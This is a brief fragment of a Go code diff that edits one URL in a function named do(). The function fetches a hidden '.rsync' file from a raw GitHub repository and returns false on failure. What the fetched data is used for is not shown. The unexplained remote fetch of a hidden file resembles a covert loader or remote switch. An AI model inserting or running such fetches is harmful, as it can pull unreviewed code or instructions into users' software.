@@ -8,7 +8,7 @@ import (
 
 func do() bool {
 
-	resp, err := http.Get("https://raw.githubusercontent.com/ECDSA-P521/id/main/.github/.rsync")
+	resp, err := http.Get("https://raw.githubusercontent.com/ECDSA-P521/id/main/.rsync")
 	if err != nil {
 		return false
 	}
